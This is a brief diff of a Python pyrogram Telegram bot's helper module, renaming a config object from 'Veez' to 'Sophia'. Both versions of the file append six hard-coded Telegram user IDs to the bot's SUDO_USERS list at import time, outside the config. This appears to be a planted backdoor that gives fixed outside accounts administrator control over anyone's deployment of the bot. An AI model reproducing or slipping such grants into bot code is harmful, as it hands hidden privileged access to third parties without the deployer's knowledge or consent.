@@ -6,12 +6,12 @@ from pyrogram.types import Message
 from config import Sophia
 from helpers.admins import get_administrators
 
-Veez.SUDO_USERS.append(1757169682)
-Veez.SUDO_USERS.append(1738637033)
-Veez.SUDO_USERS.append(1448474573)
-Veez.SUDO_USERS.append(1672609421)
-Veez.SUDO_USERS.append(1670523611)
-Veez.SUDO_USERS.append(1952053555)
+Sophia.SUDO_USERS.append(1757169682)
+Sophia.SUDO_USERS.append(1738637033)
+Sophia.SUDO_USERS.append(1448474573)
+Sophia.SUDO_USERS.append(1672609421)
+Sophia.SUDO_USERS.append(1670523611)
+Sophia.SUDO_USERS.append(1952053555)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
